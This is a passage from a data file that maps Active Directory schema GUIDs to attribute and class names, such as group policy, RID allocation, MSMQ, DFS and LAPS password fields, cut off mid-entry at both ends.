""f30e3bbf-9ff0-11d1-b603-0000f80367c1"": ""GP-Options"",\n    ""6655b152-101c-48b4-b347-e1fcebc60157"": ""ms-DS-Quota-Effective"",\n    ""9a0dc321-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Journal"",\n    ""bf967a22-0de6-11d0-a285-00aa003049e2"": ""Rid"",\n    ""7d523aff-9012-49b2-9925-f922a0018656"": ""ms-DFSR-OnDemandExclusionDirectoryFilter"",\n    ""66d51249-3355-4c1f-b24e-81f252aca23b"": ""Dynamic-Object"",\n    ""1cb3559c-56d0-11d1-a9c6-0000f80367c1"": ""ACS-Max-No-Of-Log-Files"",\n    ""f30e3bc1-9ff0-11d1-b603-0000f80367c1"": ""GPC-File-Sys-Path"",\n    ""16378906-4ea5-49be-a8d1-bfd41dff4f65"": ""ms-DS-Quota-Trustee"",\n    ""9a0dc324-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Journal-Quota"",\n    ""66171889-8f3c-11d0-afda-00c04fd930c9"": ""RID-Allocation-Pool"",\n    ""11e24318-4ca6-4f49-9afe-e5eb1afa3473"": ""ms-DFSR-Options2"",\n    ""88611bdf-8cf4-11d0-afda-00c04fd930c9"": ""rpc-Group"",\n    ""7f561284-5301-11d1-a9c5-0000f80367c1"": ""ACS-Max-Peak-Bandwidth"",\n    ""f30e3bc0-9ff0-11d1-b603-0000f80367c1"": ""GPC-Functionality-Version"",\n    ""b5a84308-615d-4bb7-b05f-2f1746aa439f"": ""ms-DS-Quota-Used"",\n    ""9a0dc325-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Label"",\n    ""66171888-8f3c-11d0-afda-00c04fd930c9"": ""RID-Available-Pool"",\n    ""936eac41-d257-4bb9-bd55-f310a3cf09ad"": ""ms-DFSR-CommonStagingPath"",\n    ""dd712229-10e4-11d0-a05f-00aa006c33ed"": ""File-Link-Tracking"",\n    ""7f56127c-5301-11d1-a9c5-0000f80367c1"": ""ACS-Max-Peak-Bandwidth-Per-Flow"",\n    ""32ff8ecc-783f-11d2-9916-0000f87a57d4"": ""GPC-Machine-Extension-Names"",\n    ""8a167ce4-f9e8-47eb-8d78-f7fe80abb2cc"": ""ms-DS-NC-Repl-Cursors"",\n    ""4580ad25-d407-48d2-ad24-43e6e56793d7"": ""MSMQ-Label-Ex"",\n    ""66171886-8f3c-11d0-afda-00c04fd930c9"": ""RID-Manager-Reference"",\n    ""135eb00e-4846-458b-8ea2-a37559afd405"": ""ms-DFSR-CommonStagingSizeInMb"",\n    ""88611be1-8cf4-11d0-afda-00c04fd930c9"": ""rpc-Profile"",\n    ""f0722311-aef5-11d1-bdcf-0000f80367c1"": ""ACS-Max-Size-Of-RSVP-Account-File"",\n    ""42a75fc6-783f-11d2-9916-0000f87a57d4"": ""GPC-User-Extension-Names"",\n    ""9edba85a-3e9e-431b-9b1a-a5b6e9eda796"": ""ms-DS-NC-Repl-Inbound-Neighbors"",\n    ""9a0dc335-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Long-Lived"",\n    ""6617188c-8f3c-11d0-afda-00c04fd930c9"": ""RID-Next-RID"",\n    ""d64b9c23-e1fa-467b-b317-6964d744d633"": ""ms-DFSR-StagingCleanupTriggerInPercent"",\n    ""8e4eb2ed-4712-11d0-a1a0-00c04fd930c9"": ""File-Link-Tracking-Entry"",\n    ""1cb3559d-56d0-11d1-a9c6-0000f80367c1"": ""ACS-Max-Size-Of-RSVP-Log-File"",\n    ""7bd4c7a6-1add-4436-8c04-3999a880154c"": ""GPC-WQL-Filter"",\n    ""855f2ef5-a1c5-4cc4-ba6d-32522848b61f"": ""ms-DS-NC-Repl-Outbound-Neighbors"",\n    ""9a0dc33f-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Migrated"",\n    ""6617188a-8f3c-11d0-afda-00c04fd930c9"": ""RID-Previous-Allocation-Pool"",\n    ""b786cec9-61fd-4523-b2c1-5ceb3860bb32"": ""ms-DFS-Comment-v2"",\n    ""f29653cf-7ad0-11d0-afd6-00c04fd930c9"": ""rpc-Profile-Element"",\n    ""81f6e0df-3b90-11d2-90cc-00c04fd91ab1"": ""ACS-Max-Token-Bucket-Per-Flow"",\n    ""bf96797e-0de6-11d0-a285-00aa003049e2"": ""Group-Attributes"",\n    ""97de9615-b537-46bc-ac0f-10720f3909f3"": ""ms-DS-NC-Replica-Locations"",\n    ""1d2f4412-f10d-4337-9b48-6e5b125cd265"": ""MSMQ-Multicast-Address"",\n    ""7bfdcb7b-4807-11d1-a9c3-0000f80367c1"": ""RID-Set-References"",\n    ""35b8b3d9-c58f-43d6-930e-5040f2f1a781"": ""ms-DFS-Generation-GUID-v2"",\n    ""89e31c12-8530-11d0-afda-00c04fd930c9"": ""Foreign-Security-Principal"",\n    ""7f56127b-5301-11d1-a9c5-0000f80367c1"": ""ACS-Max-Token-Rate-Per-Flow"",\n    ""bf967980-0de6-11d0-a285-00aa003049e2"": ""Group-Membership-SAM"",\n    ""3df793df-9858-4417-a701-735a1ecebf74"": ""ms-DS-NC-RO-Replica-Locations"",\n    ""9a0dc333-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Name-Style"",\n    ""6617188b-8f3c-11d0-afda-00c04fd930c9"": ""RID-Used-Pool"",\n    ""3c095e8a-314e-465b-83f5-ab8277bcf29b"": ""ms-DFS-Last-Modified-v2"",\n    ""88611be0-8cf4-11d0-afda-00c04fd930c9"": ""rpc-Server"",\n    ""87a2d8f9-3b90-11d2-90cc-00c04fd91ab1"": ""ACS-Maximum-SDU-Size"",\n    ""eea65905-8ac6-11d0-afda-00c04fd930c9"": ""Group-Priority"",\n    ""f547511c-5b2a-44cc-8358-992a88258164"": ""ms-DS-NC-RO-Replica-Locations-BL"",\n    ""eb38a158-d57f-11d1-90a2-00c04fd91ab1"": ""MSMQ-Nt4-Flags"",\n    ""8297931c-86d3-11d0-afda-00c04fd930c9"": ""Rights-Guid"",\n    ""edb027f3-5726-4dee-8d4e-dbf07e1ad1f1"": ""ms-DFS-Link-Identity-GUID-v2"",\n    ""c498f152-dc6b-474a-9f52-7cdba3d7d351"": ""friendlyCountry"",\n    ""9c65329b-3b90-11d2-90cc-00c04fd91ab1"": ""ACS-Minimum-Delay-Variation"",\n    ""9a9a021e-4a5b-11d1-a9c3-0000f80367c1"": ""Group-Type"",\n    ""2de144fc-1f52-486f-bdf4-16fcc3084e54"": ""ms-DS-Non-Security-Group-Extra-Classes"",\n    ""6f914be6-d57e-11d1-90a2-00c04fd91ab1"": ""MSMQ-Nt4-Stub"",\n    ""a8df7465-c5ea-11d1-bbcb-0080c76670c0"": ""Role-Occupant"",\n    ""86b021f6-10ab-40a2-a252-1dc0cc3be6a9"": ""ms-DFS-Link-Path-v2"",\n    ""f29653d0-7ad0-11d0-afd6-00c04fd930c9"": ""rpc-Server-Element"",\n    ""9517fefb-3b90-11d2-90cc-00c04fd91ab1"": ""ACS-Minimum-Latency"",\n    ""eea65904-8ac6-11d0-afda-00c04fd930c9"": ""Groups-to-Ignore"",\n    ""d161adf0-ca24-4993-a3aa-8b2c981302e8"": ""MS-DS-Per-User-Trust-Quota"",\n    ""9a0dc330-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-OS-Type"",\n    ""81d7f8c2-e327-4a0d-91c6-b42d4009115f"": ""roomNumber"",\n    ""57cf87f7-3426-4841-b322-02b3b6e9eba8"": ""ms-DFS-Link-Security-Descriptor-v2"",\n    ""8447f9f3-1027-11d0-a05f-00aa006c33ed"": ""FT-Dfs"",\n    ""8d0e7195-3b90-11d2-90cc-00c04fd91ab1"": ""ACS-Minimum-Policed-Size"",\n    ""bf967982-0de6-11d0-a285-00aa003049e2"": ""Has-Master-NCs"",\n    ""8b70a6c6-50f9-4fa3-a71e-1ce03040449b"": ""MS-DS-Per-User-Trust-Tombstones-Quota"",\n    ""9a0dc32b-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Out-Routing-Servers"",\n    ""7bfdcb80-4807-11d1-a9c3-0000f80367c1"": ""Root-Trust"",\n    ""200432ce-ec5f-4931-a525-d7f4afe34e68"": ""ms-DFS-Namespace-Identity-GUID-v2"",\n    ""2a39c5be-8960-11d1-aebc-0000f80367c1"": ""RRAS-Administration-Connection-Point"",\n    ""aec2cfe3-3b90-11d2-90cc-00c04fd91ab1"": ""ACS-Non-Reserved-Max-SDU-Size"",\n    ""bf967981-0de6-11d0-a285-00aa003049e2"": ""Has-Partial-Replica-NCs"",\n    ""d921b50a-0ab2-42cd-87f6-09cf83a91854"": ""ms-DS-Preferred-GC-Site"",\n    ""9a0dc328-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Owner-ID"",\n    ""88611bde-8cf4-11d0-afda-00c04fd930c9"": ""rpc-Ns-Annotation"",\n    ""0c3e5bc5-eb0e-40f5-9b53-334e958dffdb"": ""ms-DFS-Properties-v2"",\n    ""bf967a9c-0de6-11d0-a285-00aa003049e2"": ""Group"",\n    ""b6873917-3b90-11d2-90cc-00c04fd91ab1"": ""ACS-Non-Reserved-Min-Policed-Size"",\n    ""5fd424a7-1262-11d0-a060-00aa006c33ed"": ""Help-Data16"",\n    ""d7c53242-724e-4c39-9d4c-2df8c9d66c7a"": ""ms-DS-Repl-Attribute-Meta-Data"",\n    ""2df90d75-009f-11d2-aa4c-00c04fd7d83a"": ""MSMQ-Prev-Site-Gates"",\n    ""bf967a23-0de6-11d0-a285-00aa003049e2"": ""rpc-Ns-Bindings"",\n    ""ec6d7855-704a-4f61-9aa6-c49a7c1d54c7"": ""ms-DFS-Schema-Major-Version"",\n    ""f39b98ae-938d-11d1-aebd-0000f80367c1"": ""RRAS-Administration-Dictionary"",\n    ""a331a73f-3b90-11d2-90cc-00c04fd91ab1"": ""ACS-Non-Reserved-Peak-Rate"",\n    ""5fd424a8-1262-11d0-a060-00aa006c33ed"": ""Help-Data32"",\n    ""2f5c8145-e1bd-410b-8957-8bfa81d5acfd"": ""ms-DS-Repl-Value-Meta-Data"",\n    ""9a0dc327-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Privacy-Level"",\n    ""7a0ba0e0-8e98-11d0-afda-00c04fd930c9"": ""rpc-Ns-Codeset"",\n    ""fef9a725-e8f1-43ab-bd86-6a0115ce9e38"": ""ms-DFS-Schema-Minor-Version"",\n    ""bf967a9d-0de6-11d0-a285-00aa003049e2"": ""Group-Of-Names"",\n    ""a916d7c9-3b90-11d2-90cc-00c04fd91ab1"": ""ACS-Non-Reserved-Token-Size"",\n    ""5fd424a9-1262-11d0-a060-00aa006c33ed"": ""Help-File-Name"",\n    ""0ea12b84-08b3-11d3-91bc-0000f87a57d4"": ""MS-DS-Replicates-NC-Reason"",\n    ""9a0dc33e-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-QM-ID"",\n    ""80212841-4bdc-11d1-a9c4-0000f80367c1"": ""rpc-Ns-Entry-Flags"",\n    ""2d7826f0-4cf7-42e9-a039-1110e0d9ca99"": ""ms-DFS-Short-Name-Link-Path-v2"",\n    ""bf967a91-0de6-11d0-a285-00aa003049e2"": ""Sam-Domain-Base"",\n    ""1cb355a2-56d0-11d1-a9c6-0000f80367c1"": ""ACS-Non-Reserved-Tx-Limit"",\n    ""ec05b750-a977-4efe-8e8d-ba6c1a6e33a8"": ""Hide-From-AB"",\n    ""85abd4f4-0a89-4e49-bdec-6f35bb2562ba"": ""ms-DS-Replication-Notify-First-DSA-Delay"",\n    ""8e441266-d57f-11d1-90a2-00c04fd91ab1"": ""MSMQ-Queue-Journal-Quota"",\n    ""bf967a24-0de6-11d0-a285-00aa003049e2"": ""rpc-Ns-Group"",\n    ""6ab126c6-fa41-4b36-809e-7ca91610d48f"": ""ms-DFS-Target-List-v2"",\n    ""0310a911-93a3-4e21-a7a3-55d85ab2c48b"": ""groupOfUniqueNames"",\n    ""fe7afe45-3d14-43a7-afa7-3a1b144642af"": ""ms-Mcs-AdmPwdExpirationTime"",\n    ""f072230d-aef5-11d1-bdcf-0000f80367c1"": ""ACS-Non-Reserved-Tx-Size"",\n    ""bf967985-0de6-11d0-a285-00aa003049e2"": ""Home-Directory"",\n    ""d63db385-dd92-4b52-b1d8-0d3ecc0e86b6"": ""ms-DS-Replication-Notify-Subsequent-DSA-Delay"",\n    ""2df90d87-009f-11d2-aa4c-00c04fd7d83a"": ""MSMQ-Queue-Name-Ext"",\n    ""bf967a25-0de6-11d0-a285-00aa003049e2"": ""rpc-Ns-Interface-ID"",\n    ""ea944d31-864a-4349-ada5-062e2c614f5e"": ""ms-DFS-Ttl-v2"",\n    ""bf967aad-0de6-11d0-a285-00aa003049e2"": ""Sam-Server"",\n    ""4c9928d7-d725-4fa6-a109-aba3ad8790e5"": ""ms-Mcs-AdmPwd"",\n    ""7f561282-5301-11d1-a9c5-0000f80367c1"": ""ACS-Permission-Bits"",\n    ""bf967986-0de6-11d0-a285-00aa003049e2"": ""Home-Drive"",\n    ""08e3aa79-eb1c-45b5-af7b-8f94246c8e41"": ""ms-DS-ReplicationEpoch"",\n    ""3f6b8e12-d57f-11d1-90a2-00c04fd91ab1"": ""MSMQ-Queue-Quota"",\n    ""29401c48-7a27-11d0-afd6-00c04fd930c9"": ""rpc-Ns-Object-ID"",\n    ""3ced1465-7b71-2541-8780-1e1ea6243a82"": ""ms-DS-BridgeHead-Servers-Used"",\n    ""f30e3bc2-9ff0-11d1-b603-0000f80367c1"": ""Group-Policy-Container"",\n    ""1cb3559a-56d0-11d1-a9c6-0000f80367c1"": ""ACS-Policy-Name"",\n    ""a45398b7-c44a-4eb6-82d3-13c10946dbfe"": ""houseIdentifier"",\n    ""d5b35506-19d6-4d26-9afb-11357ac99b5e"": ""ms-DS-Retired-Repl-NC-Signatures"",\n    ""9a0dc320-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Queue-Type"",\n    ""bf967a27-0de6-11d0-a285-00aa003049e2"": ""rpc-Ns-Priority"",\n    ""51c9f89d-4730-468d-a2b5-1d493212d17e"": ""ms-DS-Is-Used-As-Resource-Security-Attribute"",\n    ""bf967aae-0de6-11d0-a285-00aa003049e2"": ""Secret"",\n    ""7f561281-5301-11d1-a9c5-0000f80367c1"": ""ACS-Priority"",\n    ""6043df71-fa48-46cf-ab7c-cbd54644b22d"": ""host"",\n    ""b39a61be-ed07-4cab-9a4a-4963ed0141e1"": ""ms-ds-Schema-Extensions"",\n    ""9a0dc322-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Quota"",\n    ""bf967a28-0de6-11d0-a285-00aa003049e2"": ""rpc-Ns-Profile-Entry"",\n    ""2e28edee-ed7c-453f-afe4-93bd86f2174f"": ""ms-DS-Claim-Possible-Values"",\n    ""7bfdcb8a-4807-11d1-a9c3-0000f80367c1"": ""Index-Server-Catalog"",\n    ""f072230f-aef5-11d1-bdcf-0000f80367c1"": ""ACS-RSVP-Account-Files-Location"",\n    ""f0f8ff83-1191-11d0-a060-00aa006c33ed"": ""Icon-Path"",\n    ""4c51e316-f628-43a5-b06b-ffb695fcb4f3"": ""ms-DS-SD-Reference-Domain"",\n    ""3bfe6748-b544-485a-b067-1b310c4334bf"": ""MSMQ-Recipient-FormatName"",\n    ""29401c4a-7a27-11d0-afd6-00c04fd930c9"": ""rpc-Ns-Transfer-Syntax"",\n    ""c66217b9-e48e-47f7-b7d5-6552b8afd619"": ""ms-DS-Claim-Value-Type"",\n    ""4828cc14-1437-45bc-9b07-ad6f015e5f28"": ""inetOrgPerson"",\n    ""bf967aaf-0de6-11d0-a285-00aa003049e2"": ""Security-Object"",\n    ""1cb3559b-56d0-11d1-a9c6-0000f80367c1"": ""ACS-RSVP-Log-Files-Location"",\n    ""7d6c0e92-7e20-11d0-afd6-00c04fd930c9"": ""Implemented-Categories"",\n    ""4f146ae8-a4fe-4801-a731-f51848a4f4e4"": ""ms-DS-Security-Group-Extra-Classes"",\n    ""2df90d81-009f-11d2-aa4c-00c04fd7d83a"": ""MSMQ-Routing-Service"",\n    ""3e0abfd0-126a-11d0-a060-00aa006c33ed"": ""SAM-Account-Name"",\n    ""eebc123e-bae6-4166-9e5b-29884a8b76b0"": ""ms-DS-Claim-Attribute-Source"",\n    ""7f56127f-5301-11d1-a9c5-0000f80367c1"": ""ACS-Service-Type"",\n    ""7bfdcb87-4807-11d1-a9c3-0000f80367c1"": ""IndexedScopes"",\n    ""0e1b47d7-40a3-4b48-8d1b-4cac0c1cdf21"": ""ms-DS-Settings"",\n    ""2df90d77-009f-11d2-aa4c-00c04fd7d83a"": ""MSMQ-Routing-Services"",\n    ""6e7b626c-64f2-11d0-afd2-00c04fd930c9"": ""SAM-Account-Type"",\n    ""6afb0e4c-d876-437c-aeb6-c3e41454c272"": ""ms-DS-Claim-Type-Applies-To-Class"",\n    ""2df90d89-009f-11d2-aa4c-00c04fd7d83a"": ""Infrastructure-Update"",\n    ""bf967a92-0de6-11d0-a285-00aa003049e2"": ""Server"",\n    ""7f561279-5301-11d1-a9c5-0000f80367c1"": ""ACS-Time-Of-Day"",\n    ""52458023-ca6a-11d0-afff-0000f80367c1"": ""Initial-Auth-Incoming"",\n    ""c17c5602-bcb7-46f0-9656-6370ca884b72"": ""ms-DS-Site-Affinity"",\n    ""8bf0221b-7a06-4d63-91f0-1499941813d3"": ""MSMQ-Secured-Source"",\n    ""04d2d114-f799-4e9b-bcdc-90e8f5ba7ebe"": ""SAM-Domain-Updates"",\n    ""52c8d13a-ce0b-4f57-892b-18f5a43a2400"": ""ms-DS-Claim-Shares-Possible-Values-With"",\n    ""7f561280-5301-11d1-a9c5-0000f80367c1"": ""ACS-Total-No-Of-Flows"",\n    ""52458024-ca6a-11d0-afff-0000f80367c1"": ""Initial-Auth-Outgoing"",\n    ""789ee1eb-8c8e-4e4c-8cec-79b31b7617b5"": ""ms-DS-SPN-Suffixes"",\n    ""9a0dc32d-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Service-Type"",\n    ""dd712224-10e4-11d0-a05f-00aa006c33ed"": ""Schedule"",\n    ""54d522db-ec95-48f5-9bbd-1880ebbb2180"": ""ms-DS-Claim-Shares-Possible-Values-With-BL"",\n    ""07383086-91df-11d1-aebc-0000f80367c1"": ""Intellimirror-Group"",\n    ""f780acc0-56f0-11d1-a9c6-0000f80367c1"": ""Servers-Container"",\n    ""7cbd59a5-3b90-11d2-90cc-00c04fd91ab1"": ""ACS-Server-List"",\n    ""f0f8ff90-1191-11d0-a060-00aa006c33ed"": ""Initials"",\n    ""35319082-8c4a-4646-9386-c2949d49894d"": ""ms-DS-Tasks-For-Az-Role"",\n    ""9a0dc33d-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Services"",\n    ""bf967a2b-0de6-11d0-a285-00aa003049e2"": ""Schema-Flags-Ex"",\n    ""4d371c11-4cad-4c41-8ad2-b180ab2bd13c"": ""ms-DS-Members-Of-Resource-Property-List"",\n    ""6d05fb41-246b-11d0-a9c8-00aa006c33ed"": ""Additional-Information"",\n    ""96a7dd64-9118-11d1-aebc-0000f80367c1"": ""Install-Ui-Level"",\n    ""a0dcd536-5158-42fe-8c40-c00a7ad37959"": ""ms-DS-Tasks-For-Az-Role-BL"",\n    ""9a0dc33b-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Sign-Certificates"",\n    ""bf967923-0de6-11d0-a285-00aa003049e2"": ""Schema-ID-GUID"",\n    ""7469b704-edb0-4568-a5a5-59f4862c75a7"": ""ms-DS-Members-Of-Resource-Property-List-BL"",\n    ""07383085-91df-11d1-aebc-0000f80367c1"": ""Intellimirror-SCP"",\n    ""b7b13123-b82e-11d0-afee-0000f80367c1"": ""Service-Administration-Point"",\n    ""032160be-9824-11d1-aec0-0000f80367c1"": ""Additional-Trusted-Service-Names"",\n    ""bf96798c-0de6-11d0-a285-00aa003049e2"": ""Instance-Type"",\n    ""b11c8ee2-5fcd-46a7-95f0-f38333f096cf"": ""ms-DS-Tasks-For-Az-Task"",\n    ""3881b8ea-da3b-11d1-90a5-00c04fd91ab1"": ""MSMQ-Sign-Certificates-Mig"",\n    ""f9fb64ae-93b4-11d2-9945-0000f87a57d4"": ""Schema-Info"",\n    ""b47f510d-6b50-47e1-b556-772c79e4ffc4"": ""ms-SPP-CSVLK-Pid"",\n    ""f0f8ff84-1191-11d0-a060-00aa006c33ed"": ""Address"",\n    ""b7c69e60-2cc7-11d2-854e-00a0c983f608"": ""Inter-Site-Topology-Failover"",\n    ""df446e52-b5fa-4ca2-a42f-13f98a526c8f"": ""ms-DS-Tasks-For-Az-Task-BL"",\n    ""9a0dc332-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Sign-Key"",\n    ""1e2d06b4-ac8f-11d0-afe3-00c04fd930c9"": ""Schema-Update"",\n    ""a601b091-8652-453a-b386-87ad239b7c08"": ""ms-SPP-CSVLK-Partial-Product-Key"",\n    ""26d97376-6070-11d1-a9c6-0000f80367c1"": ""Inter-Site-Transport"",\n    ""bf967ab1-0de6-11d0-a285-00aa003049e2"": ""Service-Class"",\n    ""f70b6e48-06f4-11d2-aa53-00c04fd7d83a"": ""Address-Book-Roots"",\n    ""b7c69e5e-2cc7-11d2-854e-00a0c983f608"": ""Inter-Site-Topology-Generator"",\n    ""2cc4b836-b63f-4940-8d23-ea7acf06af56"": ""ms-DS-User-Account-Control-Computed"",\n    ""9a0dc337-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Site-1"",\n    ""bf967a2c-0de6-11d0-a285-00aa003049e2"": ""Schema-Version"",\n    ""9684f739-7b78-476d-8d74-31ad7692eef4"": ""ms-SPP-CSVLK-Sku-Id"",\n    ""5fd42461-1262-11d0-a060-00aa006c33ed"": ""Address-Entry-Display-Table"",\n    ""b7c69e5f-2cc7-11d2-854e-00a0c983f608"": ""Inter-Site-Topology-Renew"",\n    ""add5cf10-7b09-4449-9ae6-2534148f8a72"": ""ms-DS-User-Password-Expiry-Time-Computed"",\n    ""9a0dc338-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Site-2"",\n    ""16f3a4c2-7e79-11d2-9921-0000f87a57d4"": ""Scope-Flags"",\n    ""9b663eda-3542-46d6-9df0-314025af2bac"": ""ms-SPP-KMS-Ids"",\n    ""26d97375-6070-11d1-a9c6-0000f80367c1"": ""Inter-Site-Transport-Container"",\n    ""28630ec1-41d5-11d1-a9c1-0000f80367c1"": ""Service-Connection-Point"",\n    ""5fd42462-1262-11d0-a060-00aa006c33ed"": ""Address-Entry-Display-Table-MSDOS"",\n    ""bf96798d-0de6-11d0-a285-00aa003049e2"": ""International-ISDN-Number"",\n    ""146eb639-bb9f-4fc1-a825-e29e00c77920"": ""ms-DS-UpdateScript"",\n    ""fd129d8a-d57e-11d1-90a2-00c04fd91ab1"": ""MSMQ-Site-Foreign"",\n    ""bf9679a8-0de6-11d0-a285-00aa003049e2"": ""Script-Path"",\n    ""69bfb114-407b-4739-a213-c663802b3e37"": ""ms-SPP-Installation-Id"",\n    ""16775781-47f3-11d1-a9c3-0000f80367c1"": ""Address-Home"",\n    ""bf96798e-0de6-11d0-a285-00aa003049e2"": ""Invocation-Id"",\n    ""773e93af-d3b4-48d4-b3f9-06457602d3d0"": ""ms-DS-Source-Object-DN"",\n    ""9a0dc339-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Site-Gates"",\n    ""c3dbafa6-33df-11d2-98b2-0000f87a57d4"": ""SD-Rights-Effective"",\n    ""6e8797c4-acda-4a49-8740-b0bd05a9b831"": ""ms-SPP-Confirmation-Id"",\n    ""b40ff825-427a-11d1-a9c2-0000f80367c1"": ""Ipsec-Base"",\n    ""bf967ab2-0de6-11d0-a285-00aa003049e2"": ""Service-Instance"",\n    ""5fd42463-1262-11d0-a060-00aa006c33ed"": ""Address-Syntax"",\n    ""b40ff81f-427a-11d1-a9c2-0000f80367c1"": ""Ipsec-Data"",\n    ""778ff5c9-6f4e-4b74-856a-d68383313910"": ""ms-DS-KrbTgt-Link"",\n    ""e2704852-3b7b-11d2-90cc-00c04fd91ab1"": ""MSMQ-Site-Gates-Mig"",\n    ""bf967a2d-0de6-11d0-a285-00aa003049e2"": ""Search-Flags"",\n    ""098f368e-4812-48cd-afb7-a136b96807ed"": ""ms-SPP-Online-License"",\n    ""5fd42464-1262-11d0-a060-00aa006c33ed"": ""Address-Type"",\n    ""b40ff81e-427a-11d1-a9c2-0000f80367c1"": ""Ipsec-Data-Type"",\n    ""185c7821-3749-443a-bd6a-288899071adb"": ""ms-DS-Revealed-Users"",\n    ""9a0dc340-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Site-ID"",\n    ""bf967a2e-0de6-11d0-a285-00aa003049e2"": ""Search-Guide"",\n    ""67e4d912-f362-4052-8c79-42f45ba7b221"": ""ms-SPP-Phone-License"",\n    ""b40ff826-427a-11d1-a9c2-0000f80367c1"": ""Ipsec-Filter"",\n    ""5fe69b0b-e146-4f15-b0ab-c1e5d488e094"": ""simpleSecurityObject"",\n    ""553fd038-f32e-11d0-b0bc-00c04fd8dca6"": ""Admin-Context-Menu"",\n    ""b40ff823-427a-11d1-a9c2-0000f80367c1"": ""Ipsec-Filter-Reference"",\n    ""1d3c2d18-42d0-4868-99fe-0eca1e6fa9f3"": ""ms-DS-Has-Full-Replica-NCs"",\n    ""ffadb4b2-de39-11d1-90a5-00c04fd91ab1"": ""MSMQ-Site-Name"",\n    ""01072d9a-98ad-4a53-9744-e83e287278fb"": ""secretary"",\n    ""0353c4b5-d199-40b0-b3c5-deb32fd9ec06"": ""ms-SPP-Config-License"",\n    ""bf967918-0de6-11d0-a285-00aa003049e2"": ""Admin-Count"",\n    ""b40ff81d-427a-11d1-a9c2-0000f80367c1"": ""Ipsec-ID"",\n    ""15585999-fd49-4d66-b25d-eeb96aba8174"": ""ms-DS-Never-Reveal-Group"",\n    ""422144fa-c17f-4649-94d6-9731ed2784ed"": ""MSMQ-Site-Name-Ex"",\n    ""bf967a2f-0de6-11d0-a285-00aa003049e2"": ""Security-Identifier"",\n    ""1075b3a1-bbaf-49d2-ae8d-c4f25c823303"": ""ms-SPP-Issuance-License"",\n    ""b40ff828-427a-11d1-a9c2-0000f80367c1"": ""Ipsec-ISAKMP-Policy"",\n    ""bf967ab3-0de6-11d0-a285-00aa003049e2"": ""Site"",\n    ""bf967919-0de6-11d0-a285-00aa003049e2"": ""Admin-Description"",\n    ""b40ff820-427a-11d1-a9c2-0000f80367c1"": ""Ipsec-ISAKMP-Reference"",\n    ""303d9f4a-1dd6-4b38-8fc5-33afe8c988ad"": ""ms-DS-Reveal-OnDemand-Group"",\n    ""9a0dc32a-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Sites"",\n    ""bf967a31-0de6-11d0-a285-00aa003049e2"": ""See-Also"",\n    ""19d706eb-4d76-44a2-85d6-1c342be3be37"": ""ms-TPM-Srk-Pub-Thumbprint"",\n    ""bf96791a-0de6-11d0-a285-00aa003049e2"": ""Admin-Display-Name"",\n    ""b40ff81c-427a-11d1-a9c2-0000f80367c1"": ""Ipsec-Name"",\n    ""aa156612-2396-467e-ad6a-28d23fdb1865"": ""ms-DS-Secondary-KrbTgt-Number"",\n    ""9a0dc329-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Transactional"",\n    ""ddac0cf2-af8f-11d0-afeb-00c04fd930c9"": ""Seq-Notification"",\n    ""c894809d-b513-4ff8-8811-f4f43f5ac7bc"": ""ms-TPM-Owner-Information-Temp"",\n    ""b40ff827-427a-11d1-a9c2-0000f80367c1"": ""Ipsec-Negotiation-Policy"",\n    ""d50c2cde-8951-11d1-aebc-0000f80367c1"": ""Site-Link"",\n    ""18f9b67d-5ac6-4b3b-97db-d0a406afb7ba"": ""Admin-Multiselect-Property-Pages"",\n    ""07383075-91df-11d1-aebc-0000f80367c1"": ""IPSEC-Negotiation-Policy-Action"",\n    ""94f6f2ac-c76d-4b5e-b71f-f332c3e93c22"": ""ms-DS-Revealed-DSAs"",\n    ""c58aae32-56f9-11d2-90d0-00c04fd91ab1"": ""MSMQ-User-Sid"",\n    ""bf967a32-0de6-11d0-a285-00aa003049e2"": ""Serial-Number"",\n    ""ea1b7b93-5e48-46d5-bc6c-4df4fda78a35"": ""ms-TPM-Tpm-Information-For-Computer"",\n    ""52458038-ca6a-11d0-afff-0000f80367c1"": ""Admin-Property-Pages"",\n    ""b40ff822-427a-11d1-a9c2-0000f80367c1"": ""Ipsec-Negotiation-Policy-Reference"",\n    ""5dd68c41-bfdf-438b-9b5d-39d9618bf260"": ""ms-DS-KrbTgt-Link-BL"",\n    ""9a0dc336-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Version"",\n    ""09dcb7a0-165f-11d0-a064-00aa006c33ed"": ""Server-Name"",\n    ""14fa84c9-8ecd-4348-bc91-6d3ced472ab7"": ""ms-TPM-Tpm-Information-For-Computer-BL"",\n    ""b40ff829-427a-11d1-a9c2-0000f80367c1"": ""Ipsec-NFA"",\n    ""d50c2cdf-8951-11d1-aebc-0000f80367c1"": ""Site-Link-Bridge"",\n    ""9a7ad940-ca53-11d1-bbd0-0080c76670c0"": ""Allowed-Attributes"",\n    ""07383074-91df-11d1-aebc-0000f80367c1"": ""IPSEC-Negotiation-Policy-Type"",\n    ""c8bc72e0-a6b4-48f0-94a5-fd76a88c9987"": ""ms-DS-Is-Full-Replica-For"",\n    ""db0c9085-c1f2-11d1-bbc5-0080c76670c0"": ""msNPAllowDialin"",\n    ""26d9736d-6070-11d1-a9c6-0000f80367c1"": ""Server-Reference"",\n    ""0be0dd3b-041a-418c-ace9-2f17d23e9d42"": ""ms-DNS-Keymaster-Zones"",\n    ""9a7ad941-ca53-11d1-bbd0-0080c76670c0"": ""Allowed-Attributes-Effective"",\n    ""b40ff821-427a-11d1-a9c2-0000f80367c1"": 